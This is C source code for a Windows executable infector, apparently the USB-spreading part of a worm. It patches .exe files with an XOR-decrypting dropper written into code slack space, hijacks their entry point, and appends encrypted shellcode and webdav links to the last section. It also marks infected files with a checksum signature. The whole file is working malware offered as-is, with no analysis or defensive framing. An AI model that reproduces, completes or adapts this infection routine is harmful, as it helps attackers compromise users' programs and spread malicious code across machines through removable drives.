#include "main.h"
#include "globals.h"
#include "resource.h"


HRSRC							resource;
HGLOBAL							global;

VOID usb_file_injector(LPCSTR file_name)
{
	ERROR_CODE					status;

	PIMAGE_DOS_HEADER			dos_header;
	PIMAGE_NT_HEADERS			nt_headers;
	PIMAGE_SECTION_HEADER		section_header, section_header2;

	PDWORD						raw_file,
								out_file,
								shellcode,
								shellcode_raw_base;
	DWORD						module_base;

	UINT						raw_file_size,
								out_file_size,
								shellcode_size;

	PBYTE						raw_dropper,
								ptr;

	DWORD						host_oep;
	BYTE						key,
								value;

#define SC0_DROP_SHELLCODE		8
#define SC0_DROP_COUNT			13
#define SC0_DROP_KEY			20

	BYTE						dropper[25] = {	0xe8, 0x00, 0x00, 0x00, 0x00,							// CALL @DELTA								// OFFSET: 0,	SIZE: 5
												0x5F,													// POP EDI									// OFFSET: 5,	SIZE: 1
												0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,						// ADD EDI, @OFFSET							// OFFSET: 6,	SIZE: 6
												0xb9, 0x00, 0x00, 0x00, 0x00,							// MOV ECX, @COUNTER						// OFFSET: 12,	SIZE: 5
												0x80, 0x34, 0x39, 0x00,									// XOR BYTE PTR DS:[ECX + EDI], @KEY		// OFFSET: 17,	SIZE: 4
												0xe2, 0xfa,												// LOOPD SHORT @XOR							// OFFSET: 21,	SIZE: 2
												0xff, 0xe7 };											// JMP EDI									// OFFSET: 23,	SIZE, 2
	UINT						size_of_webdav_links;
	INT							i;

	// Test file extension (must be .exe)
	ptr = (PBYTE)file_name;
	while (*ptr != 0) {
		ptr++;
	}
	if (*(PDWORD)((DWORD)ptr - 4) != 0x6578652e) {
		return;
	}

#ifdef DEBUG_OUT
	DEBUG("+usb> Executable extension found");
#endif

	// Open file
	if (!read_raw_into_buffer(file_name, &raw_file_size, (LPVOID *)&raw_file)) {
		return;
	}

	// Allocate memory to modified pool
	out_file_size		= (DWORD)(raw_file_size + 0x1000);
	out_file			= (PDWORD)VirtualAlloc(NULL, out_file_size + 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Test file for proper binary headers
	dos_header		= (PIMAGE_DOS_HEADER)raw_file;
	if ((WORD)dos_header->e_magic != 'ZM') {
		return;
	}

	nt_headers		= (PIMAGE_NT_HEADERS)((DWORD)raw_file + (DWORD)dos_header->e_lfanew);
	if ((WORD)nt_headers->Signature != 'EP') {
		return;
	}

	// Check signature
	if (dos_header->e_csum == SC0_SIGNATURE) {
#ifdef DEBUG_OUT
		DEBUG("+usb> Sig detected in %s", file_name);
#endif
		return;
	}

	// Check probability
	if (compute_probability(global_config.pe_probability) == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+usb> PE Probability returned false, skipping file");
#endif
		return;
	}

#ifdef DEBUG_OUT
	DEBUG("+usb> Infecting file %s", file_name);
#endif

	host_oep = (DWORD)nt_headers->OptionalHeader.AddressOfEntryPoint;

	// Build shellcode
	{
		/*
		shellcode = (PDWORD)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

		// Get our module base
		module_base = get_local_dll_base();

		// Get our executable abs addr
		dos_header		= (PIMAGE_DOS_HEADER)module_base;
		nt_headers		= (PIMAGE_NT_HEADERS)((DWORD)module_base + (DWORD)dos_header->e_lfanew);
		section_header	= IMAGE_FIRST_SECTION(nt_headers);

		// Check if we're in the right segment
		if (!string_compare((LPCSTR)section_header->Name, ".textbss", string_length(".textbss"))) {
			section_header++;
		}

		ptr = (PBYTE)((DWORD)module_base + (DWORD)section_header->VirtualAddress);

		// Get shellcode entry
		while ((*(PWORD)ptr != 0x02f2) || (*(PWORD)((DWORD)ptr + 2) != 0x41a3)) {
			ptr++;
		}
		ptr = (PBYTE)((DWORD)ptr + 4);*/
		
		// Get shellcode resource 
		if ((resource == 0) || (global == 0)) {
/*
#ifndef _WIN64
			resource			= FindResource(get_local_dll_base(), MAKEINTRESOURCE(IDR_SC_PEINFECT1), L"SC_PEINFECT");
			global				= LoadResource(get_local_dll_base(), resource);
#else
			resource			= FindResource(get_local_dll_base64(), MAKEINTRESOURCE(IDR_SC_PEINFECT1), L"SC_PEINFECT");
			global				= LoadResource(get_local_dll_base64(), resource);
#endif
*/
			if ((resource == 0) || (global == 0)) {
#ifdef DEBUG_OUT
				DEBUG("+usb> Error in loading resource.");
#endif
				return;
			}
		}
		LockResource(global);
		
		//shellcode_raw_base = (PDWORD)ptr;

#ifdef DEBUG_OUT
	DEBUG("+usb> Loaded resource... [%s]", file_name);
#endif

		// Get shellcode raw size
		//shellcode_size = 0;
		//while (TRUE) {

		//	if (*(PDWORD)ptr == 0xeb89f1ed) {
		//		break;
		//	}
		//	shellcode_size++;
		//	ptr++;
		//}

		// Get total size of webdav links
		i = 0;
		size_of_webdav_links = 0;
		while (webdav_links[i] != NULL) {
			size_of_webdav_links += string_length(webdav_links[i]);
			i++;
		}

		// Get shellcode information
		status = get_shellcode_from_pe((PDWORD)global, &shellcode_raw_base, &shellcode_size);

		// Unlock resource
		UnlockResource(global);
		FreeResource(global);
		global = 0;
		resource = 0;

		shellcode = (PDWORD)HeapAlloc(GetProcessHeap(), 0, shellcode_size + size_of_webdav_links);
		ZeroMemory(shellcode, shellcode_size + size_of_webdav_links);

		// Copy shellcode
		//shellcode_size = (DWORD)((DWORD)shellcode_size + 28);
		CopyMemory(shellcode, shellcode_raw_base, shellcode_size);

		// Close handles to resources
		CloseHandle(global);
		CloseHandle(resource);
		
		//BREAK;

		// Stamp return OEP
		*(PDWORD)((SIZE_T)shellcode + shellcode_size - 24) = host_oep; //0xaaaaaaaa;

		// Append webdav links
		i = 0;
		ptr = (PBYTE)((DWORD)shellcode + shellcode_size);
		while (webdav_links[i] != NULL) {
			CopyMemory(ptr, webdav_links[i], string_length(webdav_links[i]));
			ptr = (PBYTE)((DWORD)ptr + (DWORD)string_length(webdav_links[i]) + 1);
			shellcode_size = (DWORD)(shellcode_size + string_length(webdav_links[i]) + 1);
			i++;
		}

#ifdef DEBUG_OUT
	DEBUG("+usb> Appended Lists... [%s]", file_name);
#endif
	}

	// Copy headers to new file
	//BREAK;
	dos_header		= (PIMAGE_DOS_HEADER)raw_file;
	nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)raw_file + dos_header->e_lfanew);	
	CopyMemory(out_file, raw_file, nt_headers->OptionalHeader.SizeOfHeaders);

	// Obtain file headers
	dos_header		= (PIMAGE_DOS_HEADER)out_file;
	nt_headers		= (PIMAGE_NT_HEADERS)((SIZE_T)out_file + (DWORD)dos_header->e_lfanew);
	section_header	= IMAGE_FIRST_SECTION(nt_headers);

	// Copy each segment	
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
		if ((section_header->SizeOfRawData == 0) || (section_header->PointerToRawData == 0)) {
			section_header++;
			continue;
		}

		CopyMemory((PVOID)((SIZE_T)out_file + section_header->PointerToRawData), (PVOID)((SIZE_T)raw_file + section_header->PointerToRawData), section_header->SizeOfRawData);
		section_header++;
	}
	//section_header--;

	//BREAK;

	// Determine executable segment
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
		if (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			break;
		}
	}

	// Find .text slack space to install dropper
	section_header	= IMAGE_FIRST_SECTION(nt_headers);
	for (i = 0, ptr = (PBYTE)((DWORD)out_file + section_header->PointerToRawData); i < section_header->SizeOfRawData; i++, ptr++) {
		if (check_zeros(ptr, sizeof(dropper))) {
			break;
		}
	}
	if (i == section_header->SizeOfRawData) {
#ifdef DEBUG_OUT
		DEBUG("+usb> Insufficient slack space in %s to install shellcode", file_name);
#endif
		//BREAK;

		// Cleanup
		VirtualFree(raw_file, raw_file_size, MEM_RELEASE);
		HeapFree(GetProcessHeap(), 0, shellcode);
		VirtualFree(out_file, out_file_size + 0x1000, MEM_RELEASE);

		return;
	}	

#ifdef DEBUG_OUT
	DEBUG("+usb> Modifying headers... [%s]", file_name);
#endif
	raw_dropper = ptr;

	// Generate encryption key
	key = generate_random_byte_range(250);

	// Install dropper
	CopyMemory(raw_dropper, dropper, sizeof(dropper));

	// Install dropper offsets
	section_header2 = (PIMAGE_SECTION_HEADER)((DWORD)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));
	*(PDWORD)((DWORD)raw_dropper + SC0_DROP_SHELLCODE)	=	(DWORD)((section_header2->VirtualAddress + section_header2->SizeOfRawData) - 
															(section_header->VirtualAddress + (DWORD)(((raw_dropper - (DWORD)out_file - section_header->PointerToRawData))))) - 5;
	*(PDWORD)((DWORD)raw_dropper + SC0_DROP_COUNT)		= shellcode_size;
	*(PBYTE)((DWORD)raw_dropper + SC0_DROP_KEY)			= key;


	// Adjust AddressOfEntryPoint
	nt_headers->OptionalHeader.AddressOfEntryPoint = (DWORD)((DWORD)raw_dropper - (DWORD)out_file - section_header->PointerToRawData) + section_header->VirtualAddress;

	// Append shellcode
	section_header = section_header2;
	CopyMemory((void *)((DWORD)out_file + section_header->PointerToRawData + section_header->SizeOfRawData), shellcode, shellcode_size);

	// Encrypt shellcode
	for (i = 1, ptr = (PBYTE)((DWORD)out_file + section_header->PointerToRawData + section_header->SizeOfRawData + 1); i < shellcode_size; i++, ptr++) {
		*ptr ^= key;
	}

	// Append any EOF data, if any
	if ((section_header->PointerToRawData + section_header->SizeOfRawData) < raw_file_size) {

		CopyMemory(	(void *)((DWORD)out_file + section_header->PointerToRawData + section_header->SizeOfRawData + 0x1000), 
					(void *)((DWORD)raw_file + section_header->PointerToRawData + section_header->SizeOfRawData), 
					(SIZE_T)(raw_file_size - (section_header->PointerToRawData + section_header->SizeOfRawData)));

	}

	// Adjust SizeOfImage
	nt_headers->OptionalHeader.SizeOfImage = (DWORD)(nt_headers->OptionalHeader.SizeOfImage + 0x1000);

	// Signature
	dos_header->e_csum = SC0_SIGNATURE;

	// Increase size of last segment
	//section_header						= (PIMAGE_SECTION_HEADER)((DWORD)section_header + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));
	section_header->SizeOfRawData		= (DWORD)(section_header->SizeOfRawData + 0x1000);
	section_header->Misc.VirtualSize	= (DWORD)(section_header->Misc.VirtualSize + 0x1000);
	
	section_header->Characteristics = (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE);

	// Write file to disk
	write_raw_to_disk(file_name, out_file, out_file_size);

	// Cleanup
	VirtualFree(raw_file, raw_file_size, MEM_RELEASE);
	HeapFree(GetProcessHeap(), 0, shellcode);
	VirtualFree(out_file, out_file_size + 0x1000, MEM_RELEASE);

#ifdef DEBUG_OUT
	DEBUG("+usb> Found %s", file_name);
#endif

	Sleep(1000);

	return;
}